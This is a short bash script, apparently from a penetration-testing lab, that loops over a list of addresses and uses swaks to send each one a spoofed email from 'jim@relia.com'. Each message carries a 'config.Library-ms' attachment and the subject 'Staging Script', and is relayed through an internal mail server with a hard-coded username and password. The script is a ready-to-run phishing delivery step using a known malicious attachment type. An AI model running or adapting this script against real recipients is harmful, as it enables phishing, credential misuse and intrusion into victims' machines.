#!/bin/bash

cat emails | while read -r a; do swaks -t $a --from jim@relia.com --attach @config.Library-ms --server 192.168.195.189 --body @body.txt --header "Subject: Staging Script" --suppress-data --auth-user 'maildmz' --auth-password 'DPuBT9tGCBrTbR'; done

